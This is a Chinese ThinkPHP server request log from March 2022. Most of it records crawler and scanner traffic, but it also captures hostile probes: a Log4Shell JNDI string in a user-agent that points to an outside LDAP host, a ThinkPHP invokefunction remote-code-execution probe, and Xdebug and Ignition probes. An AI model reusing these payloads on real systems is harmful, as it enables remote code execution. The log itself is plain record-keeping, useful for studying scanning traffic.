---------------------------------------------------------------

[2022-03-05T00:36:26+08:00] 54.36.148.195 GET www.mihuanjishupinzhifuwudiyi16.com/
[运行时间：0.018095s] [吞吐率：55.26req/s] [内存消耗：2,806.95kb] [文件加载：90]
[ info ] [ LANG ] /www/wwwroot/tongchengmiyue/tp6/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'deflate, gzip, br',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)',
  'host' => 'www.mihuanjishupinzhifuwudiyi16.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------

[2022-03-05T03:05:04+08:00] 34.96.130.0 GET www.mihuanjishupinzhifuwudiyi16.com/
[运行时间：0.017946s] [吞吐率：55.72req/s] [内存消耗：2,807.33kb] [文件加载：90]
[ info ] [ LANG ] /www/wwwroot/tongchengmiyue/tp6/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com',
  'host' => 'www.mihuanjishupinzhifuwudiyi16.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------

[2022-03-05T03:58:56+08:00] 192.241.222.25 GET 40.83.103.135/actuator/health
[运行时间：0.011603s] [吞吐率：86.19req/s] [内存消耗：1,192.04kb] [文件加载：48]
[ info ] [ LANG ] /www/wwwroot/tongchengmiyue/tp6/thinkphp/lang/zh-cn.php
---------------------------------------------------------------

[2022-03-05T04:05:23+08:00] 172.70.9.81 GET admin.mihuanjishupinzhifuwudiyi44.cc/
[运行时间：0.019725s] [吞吐率：50.70req/s] [内存消耗：2,807.98kb] [文件加载：90]
[ info ] [ LANG ] /www/wwwroot/tongchengmiyue/tp6/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 (compatible; +https://developers.cloudflare.com/security-center/)',
  'sentry-trace' => '8157f8c880b844709ad230141fe5bcfe-89fd87f923a70440-',
  'host' => 'admin.mihuanjishupinzhifuwudiyi44.cc',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------

[2022-03-05T04:25:51+08:00] 111.28.189.51 GET 40.83.103.135/
[运行时间：0.019331s] [吞吐率：51.73req/s] [内存消耗：2,806.84kb] [文件加载：90]
[ info ] [ LANG ] /www/wwwroot/tongchengmiyue/tp6/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'accept' => '*/*',
  'user-agent' => '/${jndi:ldap://185.203.118.200:1389/Exploit}',
  'host' => '40.83.103.135',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------

[2022-03-05T05:16:12+08:00] 157.55.39.66 GET admin.mihuanjishupinzhifuwudiyi44.cc/admin/login/index/
[运行时间：0.019397s] [吞吐率：51.55req/s] [内存消耗：2,811.11kb] [文件加载：90]
[ info ] [ LANG ] /www/wwwroot/tongchengmiyue/tp6/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
  'from' => 'bingbot(at)microsoft.com',
  'accept-encoding' => 'gzip, deflate',
  'accept' => '*/*',
  'pragma' => 'no-cache',
  'cache-control' => 'no-cache',
  'host' => 'admin.mihuanjishupinzhifuwudiyi44.cc',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /www/wwwroot/tongchengmiyue/tp6/application/admin/view/login/index.html [ array (
) ]
---------------------------------------------------------------

[2022-03-05T05:24:40+08:00] 66.249.65.27 GET www.mihuantuanduidingjijishu65.com/
[运行时间：0.018317s] [吞吐率：54.59req/s] [内存消耗：2,808.33kb] [文件加载：90]
[ info ] [ LANG ] /www/wwwroot/tongchengmiyue/tp6/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'if-modified-since' => 'Wed, 23 Feb 2022 07:57:18 GMT',
  'accept-encoding' => 'gzip, deflate, br',
  'user-agent' => 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
  'from' => 'googlebot(at)googlebot.com',
  'accept' => 'text/html,application/xhtml+xml,application/signed-exchange;v=b3,application/xml;q=0.9,*/*;q=0.8',
  'connection' => 'keep-alive',
  'host' => 'www.mihuantuanduidingjijishu65.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------

[2022-03-05T05:24:40+08:00] 66.249.65.31 GET www.mihuantuanduidingjijishu65.com/admin/login/index/
[运行时间：0.018511s] [吞吐率：54.02req/s] [内存消耗：2,811.49kb] [文件加载：90]
[ info ] [ LANG ] /www/wwwroot/tongchengmiyue/tp6/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip, deflate, br',
  'user-agent' => 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
  'from' => 'googlebot(at)googlebot.com',
  'accept' => 'text/html,application/xhtml+xml,application/signed-exchange;v=b3,application/xml;q=0.9,*/*;q=0.8',
  'connection' => 'keep-alive',
  'cookie' => 'PHPSESSID=e36hlcpeant9e305gb268hko94',
  'host' => 'www.mihuantuanduidingjijishu65.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /www/wwwroot/tongchengmiyue/tp6/application/admin/view/login/index.html [ array (
) ]
---------------------------------------------------------------

[2022-03-05T06:32:45+08:00] 209.17.96.210 GET 40.83.103.135:443/
[运行时间：0.016909s] [吞吐率：59.14req/s] [内存消耗：2,806.75kb] [文件加载：90]
[ info ] [ LANG ] /www/wwwroot/tongchengmiyue/tp6/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)',
  'host' => '40.83.103.135:443',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------

[2022-03-05T06:32:47+08:00] 209.17.96.210 GET 40.83.103.135:443/admin/login/index/
[运行时间：0.019096s] [吞吐率：52.37req/s] [内存消耗：2,810.05kb] [文件加载：90]
[ info ] [ LANG ] /www/wwwroot/tongchengmiyue/tp6/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)',
  'host' => '40.83.103.135:443',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /www/wwwroot/tongchengmiyue/tp6/application/admin/view/login/index.html [ array (
) ]
---------------------------------------------------------------

[2022-03-05T06:54:59+08:00] 66.249.65.29 GET www.mihuantuanduidingjijishu65.com/
[运行时间：0.017229s] [吞吐率：58.04req/s] [内存消耗：2,808.75kb] [文件加载：90]
[ info ] [ LANG ] /www/wwwroot/tongchengmiyue/tp6/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'if-modified-since' => 'Wed, 23 Feb 2022 06:57:19 GMT',
  'accept-encoding' => 'gzip, deflate, br',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
  'from' => 'googlebot(at)googlebot.com',
  'accept' => 'text/html,application/xhtml+xml,application/signed-exchange;v=b3,application/xml;q=0.9,*/*;q=0.8',
  'connection' => 'keep-alive',
  'amp-cache-transform' => 'google;v="1..8"',
  'host' => 'www.mihuantuanduidingjijishu65.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------

[2022-03-05T06:55:00+08:00] 66.249.65.29 GET www.mihuantuanduidingjijishu65.com/admin/login/index/
[运行时间：0.016695s] [吞吐率：59.90req/s] [内存消耗：2,811.91kb] [文件加载：90]
[ info ] [ LANG ] /www/wwwroot/tongchengmiyue/tp6/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip, deflate, br',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
  'from' => 'googlebot(at)googlebot.com',
  'accept' => 'text/html,application/xhtml+xml,application/signed-exchange;v=b3,application/xml;q=0.9,*/*;q=0.8',
  'connection' => 'keep-alive',
  'cookie' => 'PHPSESSID=3sksod2gh5ah27a291qfnar9k7',
  'amp-cache-transform' => 'google;v="1..8"',
  'host' => 'www.mihuantuanduidingjijishu65.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /www/wwwroot/tongchengmiyue/tp6/application/admin/view/login/index.html [ array (
) ]
---------------------------------------------------------------

[2022-03-05T07:35:28+08:00] 51.159.102.248 HEAD 40.83.103.135/
[运行时间：0.018782s] [吞吐率：53.24req/s] [内存消耗：2,806.62kb] [文件加载：90]
[ info ] [ LANG ] /www/wwwroot/tongchengmiyue/tp6/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept' => '*/*',
  'user-agent' => 'curl/7.68.0',
  'host' => '40.83.103.135',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------

[2022-03-05T08:24:03+08:00] 162.142.125.213 GET 40.83.103.135:443/
[运行时间：0.019346s] [吞吐率：51.69req/s] [内存消耗：2,806.43kb] [文件加载：90]
[ info ] [ LANG ] /www/wwwroot/tongchengmiyue/tp6/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => '40.83.103.135:443',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------

[2022-03-05T08:24:04+08:00] 162.142.125.213 GET 40.83.103.135/
[运行时间：0.018518s] [吞吐率：54.00req/s] [内存消耗：2,806.97kb] [文件加载：90]
[ info ] [ LANG ] /www/wwwroot/tongchengmiyue/tp6/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)',
  'host' => '40.83.103.135',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------

[2022-03-05T08:24:05+08:00] 162.142.125.213 GET 40.83.103.135/admin/login/index/
[运行时间：0.018110s] [吞吐率：55.22req/s] [内存消耗：2,810.33kb] [文件加载：90]
[ info ] [ LANG ] /www/wwwroot/tongchengmiyue/tp6/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)',
  'host' => '40.83.103.135',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /www/wwwroot/tongchengmiyue/tp6/application/admin/view/login/index.html [ array (
) ]
---------------------------------------------------------------

[2022-03-05T08:33:41+08:00] 66.249.65.27 GET www.mihuantuanduidingjijishu65.com/
[运行时间：0.019278s] [吞吐率：51.87req/s] [内存消耗：2,807.59kb] [文件加载：90]
[ info ] [ LANG ] /www/wwwroot/tongchengmiyue/tp6/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip, deflate, br',
  'user-agent' => 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
  'from' => 'googlebot(at)googlebot.com',
  'accept' => 'text/html,application/xhtml+xml,application/signed-exchange;v=b3,application/xml;q=0.9,*/*;q=0.8',
  'connection' => 'keep-alive',
  'host' => 'www.mihuantuanduidingjijishu65.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------

[2022-03-05T08:33:42+08:00] 66.249.65.27 GET www.mihuantuanduidingjijishu65.com/admin/login/index/
[运行时间：0.018270s] [吞吐率：54.73req/s] [内存消耗：2,811.49kb] [文件加载：90]
[ info ] [ LANG ] /www/wwwroot/tongchengmiyue/tp6/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip, deflate, br',
  'user-agent' => 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
  'from' => 'googlebot(at)googlebot.com',
  'accept' => 'text/html,application/xhtml+xml,application/signed-exchange;v=b3,application/xml;q=0.9,*/*;q=0.8',
  'connection' => 'keep-alive',
  'cookie' => 'PHPSESSID=he1s6ta8t996aeqt6dbcphde28',
  'host' => 'www.mihuantuanduidingjijishu65.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /www/wwwroot/tongchengmiyue/tp6/application/admin/view/login/index.html [ array (
) ]
---------------------------------------------------------------

[2022-03-05T09:11:15+08:00] 47.253.80.146 GET /
[运行时间：0.018553s] [吞吐率：53.90req/s] [内存消耗：2,806.18kb] [文件加载：90]
[ info ] [ LANG ] /www/wwwroot/tongchengmiyue/tp6/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------

[2022-03-05T09:11:31+08:00] 47.253.80.146 GET 40.83.103.135/text4041646442690
[运行时间：0.009014s] [吞吐率：110.94req/s] [内存消耗：1,192.05kb] [文件加载：48]
[ info ] [ LANG ] /www/wwwroot/tongchengmiyue/tp6/thinkphp/lang/zh-cn.php
---------------------------------------------------------------

[2022-03-05T09:11:32+08:00] 47.253.80.146 GET 40.83.103.135/HNAP1
[运行时间：0.010054s] [吞吐率：99.46req/s] [内存消耗：1,192.03kb] [文件加载：48]
[ info ] [ LANG ] /www/wwwroot/tongchengmiyue/tp6/thinkphp/lang/zh-cn.php
---------------------------------------------------------------

[2022-03-05T09:11:32+08:00] 47.253.80.146 GET 40.83.103.135/evox/about
[运行时间：0.009900s] [吞吐率：101.01req/s] [内存消耗：1,192.04kb] [文件加载：48]
[ info ] [ LANG ] /www/wwwroot/tongchengmiyue/tp6/thinkphp/lang/zh-cn.php
---------------------------------------------------------------

[2022-03-05T09:11:33+08:00] 47.253.80.146 POST 40.83.103.135/sdk
[运行时间：0.010599s] [吞吐率：94.35req/s] [内存消耗：1,191.96kb] [文件加载：48]
[ info ] [ LANG ] /www/wwwroot/tongchengmiyue/tp6/thinkphp/lang/zh-cn.php
---------------------------------------------------------------

[2022-03-05T09:11:33+08:00] 47.253.80.146 GET /
[运行时间：0.019600s] [吞吐率：51.02req/s] [内存消耗：2,806.18kb] [文件加载：90]
[ info ] [ LANG ] /www/wwwroot/tongchengmiyue/tp6/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------

[2022-03-05T09:11:34+08:00] 47.253.80.146 GET 40.83.103.135/
[运行时间：0.018951s] [吞吐率：52.77req/s] [内存消耗：2,806.39kb] [文件加载：90]
[ info ] [ LANG ] /www/wwwroot/tongchengmiyue/tp6/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => '40.83.103.135',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------

[2022-03-05T09:11:53+08:00] 47.253.80.146 GET 40.83.103.135/
[运行时间：0.018069s] [吞吐率：55.34req/s] [内存消耗：2,806.65kb] [文件加载：90]
[ info ] [ LANG ] /www/wwwroot/tongchengmiyue/tp6/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'deflate, gzip',
  'accept' => '*/*',
  'host' => '40.83.103.135',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------

[2022-03-05T09:11:54+08:00] 47.253.80.146 GET 40.83.103.135/admin/login/index/
[运行时间：0.019981s] [吞吐率：50.05req/s] [内存消耗：2,810.07kb] [文件加载：90]
[ info ] [ LANG ] /www/wwwroot/tongchengmiyue/tp6/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'referer' => 'https://40.83.103.135:443/',
  'accept-encoding' => 'deflate, gzip',
  'accept' => '*/*',
  'host' => '40.83.103.135',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /www/wwwroot/tongchengmiyue/tp6/application/admin/view/login/index.html [ array (
) ]
---------------------------------------------------------------

[2022-03-05T11:38:34+08:00] 192.241.221.63 GET 40.83.103.135/owa/auth/logon.aspx?url=https%3a%2f%2f1%2fecp%2f
[运行时间：0.010085s] [吞吐率：99.16req/s] [内存消耗：1,192.10kb] [文件加载：48]
[ info ] [ LANG ] /www/wwwroot/tongchengmiyue/tp6/thinkphp/lang/zh-cn.php
---------------------------------------------------------------

[2022-03-05T12:02:39+08:00] 157.55.39.145 GET www.mihuanjishupinzhifuwudiyi65.cc/
[运行时间：0.026008s] [吞吐率：38.45req/s] [内存消耗：2,807.81kb] [文件加载：90]
[ info ] [ LANG ] /www/wwwroot/tongchengmiyue/tp6/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
  'from' => 'bingbot(at)microsoft.com',
  'accept-encoding' => 'gzip, deflate',
  'accept' => '*/*',
  'pragma' => 'no-cache',
  'cache-control' => 'no-cache',
  'host' => 'www.mihuanjishupinzhifuwudiyi65.cc',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------

[2022-03-05T12:02:50+08:00] 157.55.39.145 GET www.mihuanjishupinzhifuwudiyi65.cc/admin/login/index/
[运行时间：0.022040s] [吞吐率：45.37req/s] [内存消耗：2,811.15kb] [文件加载：90]
[ info ] [ LANG ] /www/wwwroot/tongchengmiyue/tp6/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'cookie' => 'PHPSESSID=smt2mskmsvo0dm8fdn65bn5jgv; path=/; HttpOnly',
  'user-agent' => 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
  'from' => 'bingbot(at)microsoft.com',
  'accept-encoding' => 'gzip, deflate',
  'accept' => '*/*',
  'pragma' => 'no-cache',
  'cache-control' => 'no-cache',
  'host' => 'www.mihuanjishupinzhifuwudiyi65.cc',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /www/wwwroot/tongchengmiyue/tp6/application/admin/view/login/index.html [ array (
) ]
---------------------------------------------------------------

[2022-03-05T13:48:51+08:00] 167.94.146.59 GET 40.83.103.135:443/
[运行时间：0.018635s] [吞吐率：53.66req/s] [内存消耗：2,806.43kb] [文件加载：90]
[ info ] [ LANG ] /www/wwwroot/tongchengmiyue/tp6/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => '40.83.103.135:443',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------

[2022-03-05T13:48:52+08:00] 167.94.146.59 GET 40.83.103.135/
[运行时间：0.018597s] [吞吐率：53.77req/s] [内存消耗：2,806.97kb] [文件加载：90]
[ info ] [ LANG ] /www/wwwroot/tongchengmiyue/tp6/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)',
  'host' => '40.83.103.135',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------

[2022-03-05T13:48:53+08:00] 167.94.146.59 GET 40.83.103.135/admin/login/index/
[运行时间：0.023271s] [吞吐率：42.97req/s] [内存消耗：2,810.33kb] [文件加载：90]
[ info ] [ LANG ] /www/wwwroot/tongchengmiyue/tp6/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)',
  'host' => '40.83.103.135',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /www/wwwroot/tongchengmiyue/tp6/application/admin/view/login/index.html [ array (
) ]
---------------------------------------------------------------

[2022-03-05T14:17:19+08:00] 45.146.165.37 GET 40.83.103.135:443/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21
[运行时间：0.012185s] [吞吐率：82.07req/s] [内存消耗：1,159.34kb] [文件加载：46]
[ info ] [ LANG ] /www/wwwroot/tongchengmiyue/tp6/thinkphp/lang/zh-cn.php
---------------------------------------------------------------

[2022-03-05T14:45:42+08:00] 45.146.165.37 GET 40.83.103.135:443/?XDEBUG_SESSION_START=phpstorm
[运行时间：0.030865s] [吞吐率：32.40req/s] [内存消耗：3,674.52kb] [文件加载：95]
[ info ] [ LANG ] /www/wwwroot/tongchengmiyue/tp6/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'accept-encoding' => 'gzip',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36',
  'host' => '40.83.103.135:443',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'XDEBUG_SESSION_START' => 'phpstorm',
)
[ info ] [ DB ] INIT mysql
[ sql ] [ DB ] CONNECT:[ UseTime:0.000438s ] mysql:host=127.0.0.1;dbname=tcmy;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `user_log` [ RunTime:0.000690s ]
[ sql ] [ SQL ] INSERT INTO `user_log` (`url` , `param` , `ip` , `uid` , `uname`) VALUES ('/' , '{\"XDEBUG_SESSION_START\":\"phpstorm\"}' , '45.146.165.37' , NULL , NULL) [ RunTime:0.000254s ]
---------------------------------------------------------------

[2022-03-05T14:45:47+08:00] 45.146.165.37 GET 40.83.103.135:443/admin/login/index/
[运行时间：0.018897s] [吞吐率：52.92req/s] [内存消耗：2,810.78kb] [文件加载：90]
[ info ] [ LANG ] /www/wwwroot/tongchengmiyue/tp6/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'accept-encoding' => 'gzip',
  'referer' => 'https://40.83.103.135:443/?XDEBUG_SESSION_START=phpstorm',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36',
  'host' => '40.83.103.135:443',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /www/wwwroot/tongchengmiyue/tp6/application/admin/view/login/index.html [ array (
) ]
---------------------------------------------------------------

[2022-03-05T14:46:54+08:00] 192.241.216.224 GET 40.83.103.135/
[运行时间：0.018388s] [吞吐率：54.38req/s] [内存消耗：2,806.75kb] [文件加载：90]
[ info ] [ LANG ] /www/wwwroot/tongchengmiyue/tp6/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 zgrab/0.x',
  'host' => '40.83.103.135',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------

[2022-03-05T16:14:12+08:00] 64.62.197.2 GET 40.83.103.135/
[运行时间：0.017959s] [吞吐率：55.68req/s] [内存消耗：2,806.39kb] [文件加载：90]
[ info ] [ LANG ] /www/wwwroot/tongchengmiyue/tp6/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => '40.83.103.135',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------

[2022-03-05T16:43:33+08:00] 45.146.165.37 GET 40.83.103.135:443/console/
[运行时间：0.009384s] [吞吐率：106.56req/s] [内存消耗：1,192.08kb] [文件加载：48]
[ info ] [ LANG ] /www/wwwroot/tongchengmiyue/tp6/thinkphp/lang/zh-cn.php
---------------------------------------------------------------

[2022-03-05T17:36:08+08:00] 45.146.165.37 POST 40.83.103.135:443/Autodiscover/Autodiscover.xml
[运行时间：0.009128s] [吞吐率：109.55req/s] [内存消耗：1,191.98kb] [文件加载：48]
[ info ] [ LANG ] /www/wwwroot/tongchengmiyue/tp6/thinkphp/lang/zh-cn.php
---------------------------------------------------------------

[2022-03-05T17:47:48+08:00] 45.146.165.37 GET 40.83.103.135:443/_ignition/execute-solution
[运行时间：0.011247s] [吞吐率：88.91req/s] [内存消耗：1,159.34kb] [文件加载：46]
[ info ] [ LANG ] /www/wwwroot/tongchengmiyue/tp6/thinkphp/lang/zh-cn.php
---------------------------------------------------------------

[2022-03-05T19:42:41+08:00] 45.146.165.37 GET 40.83.103.135:443/
[运行时间：0.017298s] [吞吐率：57.81req/s] [内存消耗：2,807.24kb] [文件加载：90]
[ info ] [ LANG ] /www/wwwroot/tongchengmiyue/tp6/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'accept-encoding' => 'gzip',
  'content-type' => 'application/json',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36',
  'host' => '40.83.103.135:443',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------

[2022-03-05T19:42:45+08:00] 45.146.165.37 GET 40.83.103.135:443/admin/login/index/
[运行时间：0.017669s] [吞吐率：56.60req/s] [内存消耗：2,810.63kb] [文件加载：90]
[ info ] [ LANG ] /www/wwwroot/tongchengmiyue/tp6/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'accept-encoding' => 'gzip',
  'referer' => 'https://40.83.103.135:443',
  'content-type' => 'application/json',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36',
  'host' => '40.83.103.135:443',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /www/wwwroot/tongchengmiyue/tp6/application/admin/view/login/index.html [ array (
) ]
---------------------------------------------------------------

[2022-03-05T20:50:00+08:00] 103.203.57.25 GET 40.83.103.135/
[运行时间：0.017556s] [吞吐率：56.96req/s] [内存消耗：2,807.10kb] [文件加载：90]
[ info ] [ LANG ] /www/wwwroot/tongchengmiyue/tp6/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'accept-encoding' => 'gzip',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36',
  'host' => '40.83.103.135',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------

[2022-03-05T20:50:10+08:00] 154.209.125.40 GET 40.83.103.135:443/
[运行时间：0.018841s] [吞吐率：53.08req/s] [内存消耗：2,807.01kb] [文件加载：90]
[ info ] [ LANG ] /www/wwwroot/tongchengmiyue/tp6/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
